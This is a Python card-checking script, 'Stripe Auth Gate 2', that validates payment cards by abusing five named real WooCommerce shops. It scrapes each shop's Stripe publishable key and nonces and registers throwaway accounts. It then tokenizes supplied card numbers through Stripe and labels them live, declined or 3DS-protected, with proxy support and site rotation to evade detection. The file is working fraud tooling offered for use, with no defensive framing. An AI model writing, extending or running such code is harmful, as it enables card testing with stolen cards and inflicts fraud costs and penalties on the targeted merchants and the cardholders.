"""
Stripe Auth Gate 2 — WooCommerce + Stripe (createAndConfirmSetupIntent)
Multi-site with auto fallback — tries multiple WooCommerce Stripe sites.

Flow:
  1. Pick a site from the list → try full flow
  2. If site fails (PK/nonce/register), try next site
  3. Auto-extract PK from site pages
  4. Register → Nonce → Stripe PM → Confirm SetupIntent
"""

import re
import uuid
import string
import random
import json
import aiohttp


# Multiple sites for fallback — if one dies, try the next
SITES = [
    "https://innercitytigers.com",
    "https://www.professionalmarine.eu",
    "https://www.domainegayda.com",
    "https://ecolution-hubs.co.uk",
    "https://shop.nemaneide.com",
]

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"


def _rand_str(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _extract_error(text: str) -> str:
    """Extract error message from Stripe/WC response."""
    m = re.search(r'"decline_code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    m = re.search(r'"message"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1)
    m = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    return ''


async def _extract_stripe_pk(session, site, headers, proxy_url=None):
    """Auto-extract Stripe publishable key from site pages."""
    pages = [
        f'{site}/my-account/add-payment-method/',
        f'{site}/my-account/',
        f'{site}/checkout/',
        f'{site}/',
        f'{site}/shop/',
    ]
    for url in pages:
        try:
            async with session.get(url, headers=headers, ssl=False, allow_redirects=True, proxy=proxy_url, timeout=15) as resp:
                text = await resp.text()
                # Pattern 1: Direct pk_live_ match
                match = re.search(r'pk_live_[a-zA-Z0-9]{20,}', text)
                if match:
                    return match.group(0)
                # Pattern 2: In JSON config
                match = re.search(r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"', text)
                if match:
                    return match.group(1)
                # Pattern 3: In JS var
                match = re.search(r"'publishableKey'\s*:\s*'(pk_live_[^']+)'", text)
                if match:
                    return match.group(1)
        except Exception:
            continue
    return None


async def _try_site(site_url, cc, mm, yy, cvv, proxy_url=None):
    """Try the full Stripe Auth flow on a single site. Returns dict or None if site-level failure."""
    site_domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
    rand = _rand_str(10)
    email = f"{rand}@gmail.com"
    gu = str(uuid.uuid4())
    mu = str(uuid.uuid4())
    si = str(uuid.uuid4())

    headers_site = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    timeout = aiohttp.ClientTimeout(total=40)
    jar = aiohttp.CookieJar(unsafe=True)

    async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:

        # ─── Step 1: Auto-extract Stripe PK ───
        stripe_pk = await _extract_stripe_pk(session, site_url, headers_site, proxy_url)
        if not stripe_pk:
            return None  # Site-level failure → try next site

        # ─── Step 2: Extract register nonce ───
        reg_nonce = None
        for path in ['/my-account/', '/my-account-2/', '/register/']:
            try:
                async with session.get(
                    f"{site_url}{path}", headers=headers_site,
                    ssl=False, allow_redirects=True, proxy=proxy_url
                ) as resp:
                    page_text = await resp.text()
                for pattern in [
                    r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                    r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                    r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                ]:
                    match = re.search(pattern, page_text)
                    if match:
                        reg_nonce = match.group(1)
                        break
                if reg_nonce:
                    break
            except Exception:
                continue

        if not reg_nonce:
            return None  # Site-level failure → try next site

        # ─── Step 3: Register account ───
        reg_data = {
            'email': email,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            'woocommerce-register-nonce': reg_nonce,
        }
        reg_headers = {
            "User-Agent": UA, "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": site_url, "Referer": f"{site_url}/my-account/",
        }
        try:
            async with session.post(
                f"{site_url}/my-account/", data=reg_data, headers=reg_headers,
                ssl=False, allow_redirects=True, proxy=proxy_url
            ) as resp:
                await resp.text()
        except Exception:
            return None

        cookies = {c.key: c.value for c in jar}
        if not any('wordpress_logged_in' in k for k in cookies):
            return None  # Registration failed → try next site

        # ─── Step 4: Extract setup intent nonce ───
        nonce = None
        for path in ['/my-account/add-payment-method/', '/my-account/payment-methods/', '/checkout/', '/my-account/']:
            try:
                async with session.get(
                    f"{site_url}{path}", headers=headers_site,
                    ssl=False, allow_redirects=True, proxy=proxy_url
                ) as resp:
                    page_text = await resp.text()
                for pattern in [
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
                    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
                    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
                    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
                    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                    r'"nonce"\s*:\s*"([a-f0-9]+)"',
                ]:
                    match = re.search(pattern, page_text)
                    if match:
                        nonce = match.group(1)
                        break
                if nonce:
                    break
            except Exception:
                continue

        if not nonce:
            return None  # Nonce not found → try next site

        # ─── Step 5: Create PaymentMethod via Stripe API ───
        stripe_headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": UA,
        }
        stripe_data = (
            f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&billing_details[address][postal_code]=10080"
            f"&billing_details[address][country]=US&billing_details[name]=John%20Doe"
            f"&billing_details[email]={email}"
            f"&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent"
            f"&referrer=https%3A%2F%2F{site_domain}"
            f"&time_on_page={random.randint(20000, 50000)}"
            f"&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}"
            f"&_stripe_version=2024-06-20"
        )

        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data, headers=stripe_headers, ssl=False, proxy=proxy_url
        ) as resp:
            stripe_text = await resp.text()

        try:
            stripe_json = json.loads(stripe_text)
        except Exception:
            stripe_json = {}

        if 'error' in stripe_json:
            err = stripe_json['error']
            display = err.get('decline_code') or err.get('code') or err.get('message') or 'TOKENIZATION_FAILED'
            # This is a CARD-level error, not site error → return it
            return {"Response": display, "Gateway": "Stripe-Auth2", "Price": "$0"}

        pm_id = stripe_json.get('id', '')
        if not pm_id or not pm_id.startswith('pm_'):
            return None  # No PM ID → site issue, try next

        # ─── Step 6: Confirm setup intent via WC AJAX ───
        confirm_headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": UA, "Origin": site_url,
            "Referer": f"{site_url}/my-account/add-payment-method/",
        }

        result_text = ''
        for ep_url, ep_params, ep_data in [
            (
                f"{site_url}/",
                {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id,
                 'wc-stripe-payment-type': 'card', '_ajax_nonce': nonce}
            ),
            (
                f"{site_url}/wp-admin/admin-ajax.php", {},
                {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id,
                 'wc-stripe-payment-type': 'card', '_ajax_nonce': nonce}
            ),
        ]:
            try:
                async with session.post(
                    ep_url, params=ep_params, headers=confirm_headers,
                    data=ep_data, ssl=False, proxy=proxy_url
                ) as resp:
                    result_text = await resp.text()
                    if resp.status == 200 and len(result_text) > 5:
                        break
            except Exception:
                continue

        if not result_text:
            return None  # No response from AJAX → try next site

        return _classify_stripe_response(result_text)


async def stripe_auth2_check(card_str: str, proxy_str=None):
    """
    Stripe Auth Gate 2 — Multi-site WooCommerce + Stripe SetupIntent
    Tries multiple sites until one works.

    Returns:
        dict with Response, Gateway, Price keys
    """
    try:
        parts = card_str.strip().split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Gateway": "Stripe-Auth2", "Price": "$0"}
        cc, mm, yy, cvv = parts
        cc = cc.strip().replace(' ', '')
        mm = mm.strip().zfill(2)
        yy = yy.strip()
        cvv = cvv.strip()
        if len(yy) == 2:
            yy = '20' + yy

        proxy_url = proxy_str if proxy_str else None

        # Shuffle sites to distribute load
        sites = list(SITES)
        random.shuffle(sites)

        last_error = "All sites failed"
        for site_url in sites:
            try:
                result = await _try_site(site_url, cc, mm, yy, cvv, proxy_url)
                if result is not None:
                    return result
                # result is None means site-level failure, try next
            except Exception:
                continue

        return {"Response": last_error, "Gateway": "Stripe-Auth2", "Price": "$0"}

    except Exception as e:
        return {"Response": f"Exception: {str(e)[:80]}", "Gateway": "Stripe-Auth2", "Price": "$0"}


def _classify_stripe_response(result_text: str) -> dict:
    """Classify the WooCommerce Stripe setup intent response."""
    rl = result_text.lower()
    err_msg = _extract_error(result_text)

    # ── SUCCESS ──
    if any(k in rl for k in ['"success":true', '"status":"succeeded"', 'payment method added', 'payment_method_added']):
        if 'decline' in rl or 'card_declined' in rl:
            return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth2", "Price": "$0"}
        return {"Response": "Payment Method Added Successfully", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── 3DS ──
    if any(k in rl for k in ['requires_action', 'authentication_required', '3d_secure', '"status":"requires_confirmation"', 'redirect_to_url']):
        return {"Response": "3DS Authentication Required", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── LIVE ──
    if any(k in rl for k in ['incorrect_cvc', 'incorrect_zip', 'insufficient_funds', 'invalid_cvc', 'cvc_check_failed']):
        return {"Response": err_msg or "CCN LIVE", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── DECLINE ──
    if any(k in rl for k in ['card_declined', 'generic_decline', 'do_not_honor', 'fraudulent', 'lost_card', 'stolen_card',
                              'pickup_card', 'restricted_card', 'transaction_not_allowed', 'security_violation']):
        return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── EXPIRED ──
    if 'expired_card' in rl or 'expired' in rl:
        return {"Response": "EXPIRED_CARD", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── VELOCITY ──
    if any(k in rl for k in ['velocity', 'too_many', 'rate_limit']):
        return {"Response": err_msg or "VELOCITY_EXCEEDED", "Gateway": "Stripe-Auth2", "Price": "$0"}

    # ── ERROR ──
    if '"success":false' in rl or '"error"' in rl:
        return {"Response": err_msg or "Unknown Error", "Gateway": "Stripe-Auth2", "Price": "$0"}

    if err_msg:
        return {"Response": err_msg, "Gateway": "Stripe-Auth2", "Price": "$0"}

    return {"Response": result_text[:120], "Gateway": "Stripe-Auth2", "Price": "$0"}
